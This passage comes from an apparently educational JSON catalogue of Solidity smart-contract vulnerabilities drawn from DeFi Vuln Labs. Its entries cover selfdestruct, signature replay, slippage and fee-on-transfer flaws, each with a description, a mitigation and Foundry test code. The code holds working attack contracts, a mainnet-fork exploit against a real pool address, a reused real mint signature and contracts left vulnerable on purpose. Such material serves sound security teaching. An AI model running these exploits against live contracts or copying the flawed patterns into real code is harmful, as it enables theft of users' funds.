address(store).balance);\n        if (address(store).balance >= 1 ether) {\n            store.withdrawFunds(1 ether); // exploit here\n        }\n    }\n}\n",
    "severity": "Medium",
    "category": "Reentrancy",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Reentrancy.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "selfdestruct",
    "slug": "selfdestruct",
    "title": "Self-Destruct Vulnerability",
    "description": "The EtherGame Self-Destruct Vulnerability is a flaw in the smart contract code that allows an attacker \nto disrupt the game by causing the EtherGame contract to self-destruct (using the selfdestruct opcode). \nThe vulnerability arises due to the dos function in the Attack contract, which performs a self-destruct\noperation on the EtherGame contract after receiving a significant amount of Ether. As a result of the self-destruct, \nthe EtherGame contract's functionality is permanently disabled, making it impossible for anyone to deposit or claim the winner's reward.",
    "mitigation": "Instead of relying on this.balance to track the deposited Ether, \nuse a state variable to keep track of the total deposited amount.",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Self-Destruct Vulnerability\n\nDescription:\nThe EtherGame Self-Destruct Vulnerability is a flaw in the smart contract code that allows an attacker \nto disrupt the game by causing the EtherGame contract to self-destruct (using the selfdestruct opcode). \nThe vulnerability arises due to the dos function in the Attack contract, which performs a self-destruct\noperation on the EtherGame contract after receiving a significant amount of Ether. As a result of the self-destruct, \nthe EtherGame contract's functionality is permanently disabled, making it impossible for anyone to deposit or claim the winner's reward.\n\nScenario:\n1. Deploy EtherGame\n2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.\n2. Deploy Attack with address of EtherGame\n3. Call Attack.attack sending 5 ether. This will break the game No one can become the winner.\n\nWhat happened?\nAttack forced the balance of EtherGame to equal 7 ether.\nNow no one can deposit and the winner cannot be set.\nDue to missing or insufficient access controls, malicious parties can self-destruct the contract.\nThe selfdestruct(address) function removes all bytecode from the contract address and sends all ether stored to the specified address.\n\nMitigation:\nInstead of relying on this.balance to track the deposited Ether, \nuse a state variable to keep track of the total deposited amount.\n*/\n\ncontract EtherGame {\n    uint public constant targetAmount = 7 ether;\n    address public winner;\n\n    function deposit() public payable {\n        require(msg.value == 1 ether, \"You can only send 1 Ether\");\n\n        uint balance = address(this).balance; // vulnerable\n        require(balance <= targetAmount, \"Game is over\");\n\n        if (balance == targetAmount) {\n            winner = msg.sender;\n        }\n    }\n\n    function claimReward() public {\n        require(msg.sender == winner, \"Not winner\");\n\n        (bool sent, ) = msg.sender.call{value: address(this).balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract ContractTest is Test {\n    EtherGame EtherGameContract;\n    Attack AttackerContract;\n    address alice;\n    address eve;\n\n    function setUp() public {\n        EtherGameContract = new EtherGame();\n        alice = vm.addr(1);\n        eve = vm.addr(2);\n        vm.deal(address(alice), 1 ether);\n        vm.deal(address(eve), 1 ether);\n    }\n\n    function testSelfdestruct() public {\n        console.log(\"Alice balance\", alice.balance);\n        console.log(\"Eve balance\", eve.balance);\n\n        console.log(\"Alice deposit 1 Ether...\");\n        vm.prank(alice);\n        EtherGameContract.deposit{value: 1 ether}();\n\n        console.log(\"Eve deposit 1 Ether...\");\n        vm.prank(eve);\n        EtherGameContract.deposit{value: 1 ether}();\n\n        console.log(\n            \"Balance of EtherGameContract\",\n            address(EtherGameContract).balance\n        );\n\n        console.log(\"Attack...\");\n        AttackerContract = new Attack(EtherGameContract);\n        AttackerContract.dos{value: 5 ether}();\n\n        console.log(\n            \"Balance of EtherGameContract\",\n            address(EtherGameContract).balance\n        );\n        console.log(\"Exploit completed, Game is over\");\n        EtherGameContract.deposit{value: 1 ether}(); // This call will fail due to contract destroyed.\n    }\n}\n\ncontract Attack {\n    EtherGame etherGame;\n\n    constructor(EtherGame _etherGame) {\n        etherGame = EtherGame(_etherGame);\n    }\n\n    function dos() public payable {\n        // You can simply break the game by sending ether so that\n        // the game balance >= 7 ether\n\n        // cast address to payable\n        address payable addr = payable(address(etherGame));\n        selfdestruct(addr);\n    }\n}\n",
    "severity": "Medium",
    "category": "Access Control",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Selfdestruct.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "selfdestruct2",
    "slug": "selfdestruct2",
    "title": "Selfdestruct2",
    "description": "No description provided.",
    "mitigation": "No mitigation provided.",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nThis excersise is about selfdestructing (deprecated) and force sending ether to a contract\nForce implements neither receive nor fallaback functions. Calls with any value will revert.\n*/\n\ncontract ContractTest is Test {\n    Force ForceContract;\n    Attack AttackerContract;\n\n    function testselfdestruct2() public {\n        ForceContract = new Force();\n        console.log(\"Balance of ForceContract:\", address(ForceContract).balance);\n        AttackerContract = new Attack();\n        console.log(\n            \"Balance of ForceContract:\",\n            address(ForceContract).balance\n        );\n        console.log(\n            \"Balance of AttackerContract:\",\n            address(AttackerContract).balance\n        );\n        AttackerContract.attack{value: 1 ether}(address(ForceContract));\n\n        console.log(\"Exploit completed\");\n        console.log(\n            \"Balance of EtherGameContract:\",\n            address(ForceContract).balance\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract Force {\n    /*\n\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =ø= /\n (______)__m_m)\n\n*/\n}\n\ncontract Attack {\n    function attack(address force) public payable {\n        selfdestruct(payable(force));\n    }\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Selfdestruct2.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "sense-finance-exp",
    "slug": "sense-finance-exp",
    "title": "SenseFinance_exp",
    "description": "No description provided.",
    "mitigation": "No mitigation provided.",
    "code": "// SPDX-License-Identifier: UNLICENSED\r\npragma solidity 0.8.18;\r\n\r\nimport \"forge-std/Test.sol\";\r\nimport \"./interface.sol\";\r\n\r\n// this excersise is about direct token manipulation\r\n\r\ninterface ISpace {\r\n    function onSwap(\r\n        SwapRequest memory request,\r\n        uint256 reservesTokenIn,\r\n        uint256 reservesTokenOut\r\n    ) external returns (uint256);\r\n\r\n    struct SwapRequest {\r\n        IVault.SwapKind kind;\r\n        IERC20 tokenIn;\r\n        IERC20 tokenOut;\r\n        uint256 amount;\r\n        // Misc data\r\n        bytes32 poolId;\r\n        uint256 lastChangeBlock;\r\n        address from;\r\n        address to;\r\n        bytes userData;\r\n    }\r\n}\r\n\r\ninterface IVault {\r\n    enum SwapKind {\r\n        GIVEN_IN,\r\n        GIVEN_OUT\r\n    }\r\n}\r\n\r\ncontract ContractTest is DSTest {\r\n    ISpace space = ISpace(0x3f9FEe026fCebb40719A69416C72B714d89a17d9);\r\n    IVault.SwapKind kind = IVault.SwapKind(0);\r\n    ISpace.SwapRequest aad =\r\n        ISpace.SwapRequest(\r\n            kind,\r\n            IERC20(0x3f9FEe026fCebb40719A69416C72B714d89a17d9),\r\n            IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0),\r\n            2000000000000000000,\r\n            0x3f9fee026fcebb40719a69416c72b714d89a17d900020000000000000000017c,\r\n            15017009,\r\n            address(this),\r\n            address(this),\r\n            \"\"\r\n        );\r\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\r\n\r\n    function setUp() public {\r\n        cheats.createSelectFork(\"mainnet\", 15017009); //fork mainnet at block 15017009\r\n    }\r\n\r\n    function testExploit() public {\r\n        //onswap:reservesTokenIn, reservesTokenOut;\r\n        console.log(\r\n            \"Amount Calculated:\",\r\n            space.onSwap(\r\n                aad,\r\n                60000000000000000000000000000000,\r\n                20000000000000000000000000\r\n            )\r\n        ); //744039785002747962\r\n        console.log(\r\n            \"Manipulated Amount Calculated:\",\r\n            space.onSwap(aad, 2000000000000000000, 2000000000000000000)\r\n        ); //1860147027671744844\r\n    }\r\n}\r\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/SenseFinance_exp.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "signature-replay",
    "slug": "signature-replay",
    "title": "Signature Replay Vulnerability",
    "description": "In this scenario, Alice signs a transaction that allows Bob to transfer tokens from Alice's account \nto Bob's account. Bob then replays this signature on multiple contracts \n(in this case, the TokenWhale and SixEyeToken contracts), each time authorizing the transfer of tokens \nfrom Alice's account to his. This is possible because the contracts use the same methodology for signing\nand validating transactions, but they do not share a nonce to prevent replay attacks.\n\nMissing protection against signature replay attacks, Same signature can be used multiple times to execute a function.",
    "mitigation": "Replay attacks can be prevented by implementing a nonce, a number that is only used once, into the signing and verification process. \n\nREF:\nhttps://medium.com/cryptronics/signature-replay-vulnerabilities-in-smart-contracts-3b6f7596df57\nhttps://medium.com/cypher-core/replay-attack-vulnerability-in-ethereum-smart-contracts-introduced-by-transferproxy-124bf3694e25",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Signature Replay Vulnerability\n\nDescription:\nIn this scenario, Alice signs a transaction that allows Bob to transfer tokens from Alice's account \nto Bob's account. Bob then replays this signature on multiple contracts \n(in this case, the TokenWhale and SixEyeToken contracts), each time authorizing the transfer of tokens \nfrom Alice's account to his. This is possible because the contracts use the same methodology for signing\nand validating transactions, but they do not share a nonce to prevent replay attacks.\n\nMissing protection against signature replay attacks, Same signature can be used multiple times to execute a function.\n\nMitigation:\nReplay attacks can be prevented by implementing a nonce, a number that is only used once, into the signing and verification process. \n\nREF:\nhttps://medium.com/cryptronics/signature-replay-vulnerabilities-in-smart-contracts-3b6f7596df57\nhttps://medium.com/cypher-core/replay-attack-vulnerability-in-ethereum-smart-contracts-introduced-by-transferproxy-124bf3694e25\n\n*/\n\ncontract ContractTest is Test {\n    TokenWhale TokenWhaleContract;\n    SixEyeToken SixEyeTokenContract;\n    address alice = vm.addr(1);\n    address bob = vm.addr(2);\n\n    constructor() {\n        TokenWhaleContract = new TokenWhale();\n        TokenWhaleContract.TokenWhaleDeploy(address(this));\n        TokenWhaleContract.transfer(alice, 1000);\n        SixEyeTokenContract = new SixEyeToken();\n        SixEyeTokenContract.TokenWhaleDeploy(address(this));\n        SixEyeTokenContract.transfer(alice, 1000);\n    }\n\n    function testSignatureReplay() public {\n        emit log_named_uint(\n            \"Balance\",\n            TokenWhaleContract.balanceOf(address(this))\n        );\n\n        bytes32 hash = keccak256(\n            abi.encodePacked(\n                address(alice),\n                address(bob),\n                uint256(499),\n                uint256(1),\n                uint256(0)\n            )\n        );\n        emit log_named_bytes32(\"hash\", hash);\n\n        // The {r, s, v} signature can be combined into one 65-byte-long sequence: 32 bytes for r , 32 bytes for s , and one byte for v\n        //r - a point on the secp256k1 elliptic curve (32 bytes)\n        //s - a point on the secp256k1 elliptic curve (32 bytes)\n        //v - recovery id (1 byte)\n\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);\n        emit log_named_uint(\"v\", v);\n        emit log_named_bytes32(\"r\", r);\n        emit log_named_bytes32(\"s\", s);\n\n        address alice_address = ecrecover(hash, v, r, s);\n        emit log_named_address(\"alice_address\", alice_address);\n        emit log_string(\n            \"If attacker got the Alice's signature, the attacker can replay this signature on the others contracts with same method.\"\n        );\n        vm.startPrank(bob);\n\n        TokenWhaleContract.transferProxy(\n            address(alice),\n            address(bob),\n            499,\n            1,\n            v,\n            r,\n            s\n        );\n        // Bob successfully transferred funds from Alice.\n        emit log_named_uint(\n            \"SET token balance of Bob\",\n            TokenWhaleContract.balanceOf(address(bob))\n        );\n\n        // Because we have nonce protect to replay, so we can not replay again in the same contract.\n        // BTW this nonce start from 0, it's not a best practice.\n        // TokenWhaleContract.transferProxy(address(alice),address(bob),499,1,v,r,s);\n        // emit log_named_uint(\"Balance of Bob\",TokenWhaleContract.balanceOf(address(bob)));\n\n        emit log_string(\n            \"Try to replay to another contract with same signature\"\n        );\n        emit log_named_uint(\n            \"Before the replay, SIX token balance of bob:\",\n            SixEyeTokenContract.balanceOf(address(bob))\n        );\n\n        SixEyeTokenContract.transferProxy(\n            address(alice),\n            address(bob),\n            499,\n            1,\n            v,\n            r,\n            s\n        );\n        emit log_named_uint(\n            \"After the replay, SIX token balance of bob:\",\n            SixEyeTokenContract.balanceOf(address(bob))\n        );\n\n        SixEyeTokenContract.transferProxy(\n            address(alice),\n            address(bob),\n            499,\n            1,\n            v,\n            r,\n            s\n        );\n        emit log_named_uint(\n            \"After the second replay, SIX token balance of bob:\",\n            SixEyeTokenContract.balanceOf(address(bob))\n        );\n    }\n}\n\ncontract TokenWhale is Test {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Simple ERC20 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n    mapping(address => uint256) nonces;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 2000;\n        balanceOf[player] = 2000;\n    }\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    function transferProxy(\n        address _from,\n        address _to,\n        uint256 _value,\n        uint256 _feeUgt,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) public returns (bool) {\n        uint256 nonce = nonces[_from];\n        emit log_named_uint(\"nonce\", nonce);\n        bytes32 h = keccak256(\n            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)\n        );\n        if (_from != ecrecover(h, _v, _r, _s)) revert();\n\n        if (\n            balanceOf[_to] + _value < balanceOf[_to] ||\n            balanceOf[msg.sender] + _feeUgt < balanceOf[msg.sender]\n        ) revert();\n        balanceOf[_to] += _value;\n\n        balanceOf[msg.sender] += _feeUgt;\n\n        balanceOf[_from] -= _value + _feeUgt;\n        nonces[_from] = nonce + 1;\n        return true;\n    }\n}\n\ncontract SixEyeToken is Test {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Six Eye Token\";\n    string public symbol = \"SIX\";\n    uint8 public decimals = 18;\n    mapping(address => uint256) nonces;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 2000;\n        balanceOf[player] = 2000;\n    }\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    function transferProxy(\n        address _from,\n        address _to,\n        uint256 _value,\n        uint256 _feeUgt,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) public returns (bool) {\n        uint256 nonce = nonces[_from];\n        bytes32 h = keccak256(\n            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)\n        );\n        if (_from != ecrecover(h, _v, _r, _s)) revert();\n\n        if (\n            balanceOf[_to] + _value < balanceOf[_to] ||\n            balanceOf[msg.sender] + _feeUgt < balanceOf[msg.sender]\n        ) revert();\n        balanceOf[_to] += _value;\n\n        balanceOf[msg.sender] += _feeUgt;\n\n        balanceOf[_from] -= _value + _feeUgt;\n        return true;\n    }\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/SignatureReplay.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "signature-replay-nba",
    "slug": "signature-replay-nba",
    "title": "SignatureReplayNBA",
    "description": "No description provided.",
    "mitigation": "No mitigation provided.",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nWe use NBA NFT incident as an example.\n\n‘Association NFT’ collection by the NBA, which triggers the ‘Allow list’ to sell out permanently. \n\nThis vulnerability could’ve allowed any malicious entity to mint several NFTs without paying any tokens. \n\nThis contract fails to verify that a signature can be used only once.\n*/\ninterface INBA {\n    struct vData {\n        bool mint_free;\n        uint256 max_mint;\n        address from;\n        uint256 start;\n        uint256 end;\n        uint256 eth_price;\n        uint256 dust_price;\n        bytes signature;\n    }\n\n    function mint_approved(\n        vData memory info,\n        uint256 number_of_items_requested,\n        uint16 _batchNumber\n    ) external;\n}\n\ncontract ContractTest is Test {\n    NBA NBAContract;\n\n    function testMintNFT() public {\n        NBAContract = new NBA();\n        // Copy any successful signature from etherscan.\n        // https://etherscan.io/tx/0x0555d3d7a9d1d5659cd99c69f15fb88da57307c3970678fb5e6547879bc548a6\n        INBA.vData memory info = INBA.vData({\n            mint_free: true,\n            max_mint: 1,\n            from: 0x23Bd1adaB0917A2Ed5007aA39e4040487BE2DAd1,\n            start: 0,\n            end: 5555555555,\n            eth_price: 0,\n            dust_price: 0,\n            signature: hex\"b3589c052ba90e14654d1fac78fb2fd9708355e1a686bed502f65e7ac0a47ad722dcc6c0dcc9445f608162648e000dcc8a845c2ed523202465dc9bdd239484b51b\"\n        });\n        INBA(address(NBAContract)).mint_approved(info, 20, 0);\n    }\n\n    receive() external payable {}\n}\n\ncontract NBA is Test {\n    uint16 public batchNumber;\n\n    address signer = 0x669F499e7BA51836BB76F7dD2bc3C1A37a5342D7;\n    struct vData {\n        bool mint_free;\n        uint256 max_mint;\n        address from;\n        uint256 start;\n        uint256 end;\n        uint256 eth_price;\n        uint256 dust_price;\n        bytes signature;\n    }\n\n    function mint_approved(\n        vData memory info,\n        uint256 number_of_items_requested,\n        uint16 _batchNumber\n    ) external view {\n        require(batchNumber == _batchNumber, \"!batch\");\n        // address from = msg.sender;\n        require(verify(info), \"Unauthorised access secret\"); // check whitelist\n        console.log(\n            \"Verified, you are in whitelist! You can mint:\",\n            number_of_items_requested\n        );\n        //_mintCards(number_of_items_requested, from);\n    }\n\n    function verify(vData memory info) public view returns (bool) {\n        require(info.from != address(0), \"INVALID_SIGNER\");\n        bytes memory cat = abi.encode(\n            info.from,\n            info.start,\n            info.end,\n            info.eth_price,\n            info.dust_price,\n            info.max_mint,\n            info.mint_free\n        );\n        // console.log(\"data-->\");\n        // console.logBytes(cat);\n        bytes32 hash = keccak256(cat);\n        // console.log(\"hash ->\");\n        //    console.logBytes32(hash);\n        require(info.signature.length == 65, \"Invalid signature length\");\n        bytes32 sigR;\n        bytes32 sigS;\n        uint8 sigV;\n        bytes memory signature = info.signature;\n        // ecrecover takes the signature parameters, and the only way to get them\n        // currently is to use assembly.\n        assembly {\n            sigR := mload(add(signature, 0x20))\n            sigS := mload(add(signature, 0x40))\n            sigV := byte(0, mload(add(signature, 0x60)))\n        }\n\n        bytes32 data = keccak256(\n            abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash)\n        );\n        address recovered = ecrecover(data, sigV, sigR, sigS);\n        return signer == recovered;\n    }\n}\n",
    "severity": "Medium",
    "category": "Access Control",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/SignatureReplayNBA.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "slippage-deadline",
    "slug": "slippage-deadline",
    "title": "Slippage - Incorrect deadline & slippage amount",
    "description": "Slippage: Slippage is the difference between the expected price of a trade \nand the price at which the trade is executed. \nIf hardcoded to 0, user will accept a minimum amount of 0 output tokens from the swap.\n\nDeadline: The function sets the deadline to the maximum uint256 value, \nwhich means the transaction can be executed at any time.\n\nIf slippage is set to 0 and there is no deadline, \nusers might potentially lose all their tokens.",
    "mitigation": "Allow the user to specify the slippage & deadline value themselves.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1676118132992405505",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\n/*\nName: Slippage - Incorrect deadline & slippage amount\n\nDescription:\nSlippage: Slippage is the difference between the expected price of a trade \nand the price at which the trade is executed. \nIf hardcoded to 0, user will accept a minimum amount of 0 output tokens from the swap.\n\nDeadline: The function sets the deadline to the maximum uint256 value, \nwhich means the transaction can be executed at any time.\n\nIf slippage is set to 0 and there is no deadline, \nusers might potentially lose all their tokens.\n\nMitigation:\nAllow the user to specify the slippage & deadline value themselves.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1676118132992405505\n*/\n\ninterface IUniswapV2Router02 {\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n}\n\ninterface IWETH {\n    function deposit() external payable;\n\n    function approve(address guy, uint256 wad) external returns (bool);\n\n    function withdraw(uint256 wad) external;\n}\n\ncontract ContractTest is Test {\n    address UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Uniswap Router address on Ethereum Mainnet\n    IWETH WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    address USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 17568400);\n    }\n\n    function testswapTokensWithMaxDeadline() external payable {\n        WETH.approve(address(UNISWAP_ROUTER), type(uint256).max);\n        WETH.deposit{value: 1 ether}();\n\n        uint256 amountIn = 1 ether;\n        uint256 amountOutMin = 0;\n        //uint256 amountOutMin = 1867363899; //1867363899 INSUFFICIENT_OUTPUT_AMOUNT\n        // Path for swapping ETH to USDT\n        address[] memory path = new address[](2);\n        path[0] = address(WETH); // WETH (Wrapped Ether)\n        path[1] = USDT; // USDT (Tether)\n\n        // No Effective Expiration Deadline\n        // The function sets the deadline to the maximum uint256 value, which means the transaction can be executed at any time,\n        // possibly under unfavorable market conditions.\n        IUniswapV2Router02(UNISWAP_ROUTER).swapExactTokensForTokens(\n            amountIn,\n            amountOutMin,\n            path,\n            address(this),\n            type(uint256).max // Setting deadline to max value\n        );\n\n        console.log(\"USDT\", IERC20(USDT).balanceOf(address(this)));\n    }\n\n    receive() external payable {}\n}\n",
    "severity": "Medium",
    "category": "Oracle",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Slippage-deadline.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "fee-on-transfer",
    "slug": "fee-on-transfer",
    "title": "STA token had a deflationary model with transfer fee of 1% charged from a recipient.",
    "description": "The actual deposited amount might be lower than the specified depositAmount of the function parameter.\n\nVulnVault: Incompatability with deflationary / fee-on-transfer tokens",
    "mitigation": "Transfer the tokens first and compare pre-/after token balances to compute the actual deposited amount.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1671084918506684418\nhttps://medium.com/1inch-network/balancer-hack-2020-a8f7131c980e\nhttps://twitter.com/BlockSecTeam/status/1600442137811689473",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: STA token had a deflationary model with transfer fee of 1% charged from a recipient.\n\nDescription:\nThe actual deposited amount might be lower than the specified depositAmount of the function parameter.\n\nVulnVault: Incompatability with deflationary / fee-on-transfer tokens\n\nMitigation:  \nTransfer the tokens first and compare pre-/after token balances to compute the actual deposited amount.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1671084918506684418\nhttps://medium.com/1inch-network/balancer-hack-2020-a8f7131c980e\nhttps://twitter.com/BlockSecTeam/status/1600442137811689473\n*/\n\ncontract ContractTest is Test {\n    STA STAContract;\n    VulnVault VulnVaultContract;\n    Vault VaultContract;\n\n    function setUp() public {\n        STAContract = new STA();\n        VulnVaultContract = new VulnVault(address(STAContract));\n        VaultContract = new Vault(address(STAContract));\n    }\n\n    function testVulnFeeOnTransfer() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        STAContract.balanceOf(address(this));\n        STAContract.transfer(alice, 1000000);\n        console.log(\"Alice's STA balance:\", STAContract.balanceOf(alice)); // charge 1% fee\n        vm.startPrank(alice);\n        STAContract.approve(address(VulnVaultContract), type(uint256).max);\n        VulnVaultContract.deposit(10000);\n        //VulnVaultContract.getBalance(alice);\n\n        console.log(\n            \"Alice deposit 10000 STA, but Alice's STA balance in VulnVaultContract:\",\n            VulnVaultContract.getBalance(alice)\n        ); // charge 1% fee\n        assertEq(\n            STAContract.balanceOf(address(VulnVaultContract)),\n            VulnVaultContract.getBalance(alice)\n        );\n    }\n\n    function testFeeOnTransfer() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        STAContract.balanceOf(address(this));\n        STAContract.transfer(alice, 1000000);\n        console.log(\"Alice's STA balance:\", STAContract.balanceOf(alice)); // charge 1% fee\n        vm.startPrank(alice);\n        STAContract.approve(address(VaultContract), type(uint256).max);\n        VaultContract.deposit(10000);\n        //VaultContract.getBalance(alice);\n\n        console.log(\n            \"Alice deposit 10000, Alice's STA balance in VaultContract:\",\n            VaultContract.getBalance(alice)\n        ); // charge 1% fee\n        assertEq(\n            STAContract.balanceOf(address(VaultContract)),\n            VaultContract.getBalance(alice)\n        );\n    }\n\n    receive() external payable {}\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address who) external view returns (uint256);\n\n    function allowance(\n        address owner,\n        address spender\n    ) external view returns (uint256);\n\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function approve(address spender, uint256 value) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n}\n\nlibrary SafeMath {\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n        uint256 c = a * b;\n        assert(c / a == b);\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a / b;\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        assert(b <= a);\n        return a - b;\n    }\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        assert(c >= a);\n        return c;\n    }\n\n    function ceil(uint256 a, uint256 m) internal pure returns (uint256) {\n        uint256 c = add(a, m);\n        uint256 d = sub(c, 1);\n        return mul(div(d, m), m);\n    }\n}\n\nabstract contract ERC20Detailed is IERC20 {\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n\n    constructor(\n        string memory name,\n        string memory symbol,\n        uint8 decimals\n    ) internal {\n        _name = name;\n        _symbol = symbol;\n        _decimals = decimals;\n    }\n\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n}\n\ncontract STA is ERC20Detailed {\n    using SafeMath for uint256;\n    mapping(address => uint256) private _balances;\n    mapping(address => mapping(address => uint256)) private _allowed;\n\n    string constant tokenName = \"Statera\";\n    string constant tokenSymbol = \"STA\";\n    uint8 constant tokenDecimals = 18;\n    uint256 _totalSupply = 100000000000000000000000000;\n    uint256 public basePercent = 100;\n\n    constructor()\n        public\n        payable\n        ERC20Detailed(tokenName, tokenSymbol, tokenDecimals)\n    {\n        _issue(msg.sender, _totalSupply);\n    }\n\n    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address owner) public view returns (uint256) {\n        return _balances[owner];\n    }\n\n    function allowance(\n        address owner,\n        address spender\n    ) public view returns (uint256) {\n        return _allowed[owner][spender];\n    }\n\n    function cut(uint256 value) public view returns (uint256) {\n        uint256 roundValue = value.ceil(basePercent);\n        uint256 cutValue = roundValue.mul(basePercent).div(10000);\n        return cutValue;\n    }\n\n    function transfer(address to, uint256 value) public returns (bool) {\n        require(value <= _balances[msg.sender]);\n        require(to != address(0));\n\n        uint256 tokensToBurn = cut(value);\n        uint256 tokensToTransfer = value.sub(tokensToBurn);\n\n        _balances[msg.sender] = _balances[msg.sender].sub(value);\n        _balances[to] = _balances[to].add(tokensToTransfer);\n\n        _totalSupply = _totalSupply.sub(tokensToBurn);\n\n        emit Transfer(msg.sender, to, tokensToTransfer);\n        emit Transfer(msg.sender, address(0), tokensToBurn);\n        return true;\n    }\n\n    function approve(address spender, uint256 value) public returns (bool) {\n        require(spender != address(0));\n        _allowed[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) public returns (bool) {\n        require(value <= _balances[from]);\n       